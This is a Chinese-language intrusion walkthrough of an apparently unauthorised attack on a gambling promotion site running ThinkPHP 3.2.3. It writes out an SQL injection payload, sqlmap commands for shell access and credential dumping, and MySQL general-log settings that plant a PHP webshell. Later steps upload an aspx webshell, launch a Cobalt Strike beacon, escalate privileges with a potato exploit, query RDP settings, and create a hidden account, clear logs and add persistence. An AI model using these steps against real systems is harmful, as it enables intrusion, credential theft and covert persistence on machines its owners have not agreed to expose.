# 目标环境信息

BC类的活动页很多都是 `thinkphp`二改的站,我们主要确定当前tp的版本号

> http://www.abc.com/index.php?s=1

![](../Images/31320242fea86cac5e977f38ec72c73b.png)

目标环境信息

*   Windows
    
*   ThinkPHP v.3.2.3
    
*   开启Debug模式
    
*   网站绝对路径 D:\\web1\\abc.com\\wwlsoeprsueords\\
    

用工具扫描日志文件

![](../Images/5a9a4bcde6f9e9f5bf80482be1b18a4e.png)

tp3 注入漏洞不存在，日志文件在 `/addons/Runtime/Logs/admin/` 路径下，但并没有扫到任何的日志文件，猜测日志文件可能为另外一个命名格式

> eg. 1606510976-20\_11\_28.log  
> 时间戳-年\_月\_日.log

该站点没有`CDN`，在fofa上搜IP发现999端口为`phpmyadmin`页面

![](../Images/01504043a820ddc7400c761b714693a2.png)

# 寻找注入

一般来说，这类的活动推广页申请进度查询是存在注入的，用burp抓包

![](../Images/d90130817ade33f6b686a4ddbef8e9a3.png)

payload 如下：

> username=123' and (extractvalue(1,concat(0x7e,(select user()),0x7e))))--+&id=13

果不其然，存在注入，还是`root`权限，直接就上`sqlmap`跑

`python3 sqlmap.py -r 1.txt --random-agent --dbms=mysql --os-shell`

![](../Images/5d13b4de7cc2fbc846495bf2abb33f16.png)

还跑了几种其他类型的注入，但我们直接 `--os-shell`报错，尝试了几次都一样返回`No output`，猜测可能有某种防护产品

# getshell

前面我们有找到`phpmyadmin`页面，我们枚举数据库账户和密码

`python3 sqlmap.py –r 1.txt --string="Surname" --users --password`

![](../Images/10fca61cf33c4dfa636ddf10b694820b.png)

并且已经帮我们解码明文了，`root`账号登录后报错`#1045 无法登录服务器`,换成 dog1账号登录成功

`phpmyadmin`写shell：

*   导出文件
    
*   写日志文件
    

`SHOW GLOBAL VARIABLES LIKE "%secure%";`

> 当secure\_file\_priv的值为null ，表示限制mysql 不允许导入|导出
> 
> 当secure\_file\_priv的值没有具体值时，表示不对mysql 的导入|导出做限制

![](../Images/d00c780f99b84a36e76c7991e001f60d.png)

不允许导出，换写日志文件方法

`SHOW VARIABLES LIKE '%general%'`

![](../Images/474cddbafa62c8e9acbc4e1ef504f32d.png)

用命令打开日志保存状态，设置日志保存路径

> set global general\_log = "ON";
> 
> set global general\_log\_file='D:/web1/abc.com/robots.php';

在sql查询语句处执行我们的php一句话，然后用蚁剑去连日志文件`robots.php`即可getshell

![](../Images/95dfe4c05995808a0c2d8595ff992aae.png)

# 绕过限制上线cs

查看phpinfo()，发现ban了成吨的函数，无法执行命令

![](../Images/f45c8ba5239a1e7be63b1597d8ccaa61.png)

我们可以上传aspx马进行绕过，这里我使用的是冰蝎3的aspx马

![](../Images/6273ba2d5ddbcfbb810f0905253b6a5f.png)

现在可以执行命令了，但还是无法查看相关文件夹等其他问题。

![](../Images/680382bb59e485e15173ca2b60dbd23d.png)

查看系统有无杀软，准备上线

> tasklist /svc

![](../Images/6c698df689ac9a4d1b4e6e04a1d1fcdf.png)

没有任何杀软，用cs生成exe上传到根目录，然后启动执行上线

![](../Images/74931586f8975c5ab92ab50aa0decd5a.png)

用烂土豆可以直接提到`system`权限

![](../Images/4d648fa54c7b515187328498585f07f0.png)

直接通过注册表查是否开启3389，端口号是多少

> REG QUERY "HKEY\_LOCAL\_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections # 查看RDP服务是否开启：1关闭，0开启
> 
> REG QUERY "HKEY\_LOCAL\_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp" /v PortNumber # 查看RDP服务的端口

![](../Images/b7ee712bfb8d172c15c2453977e5442c.png)

建一个隐藏用户直接远程登录过去，清除日志，做自启动，拿下该站点

![](../Images/42b7a27c0a78145a3c02dac8243de129.png)
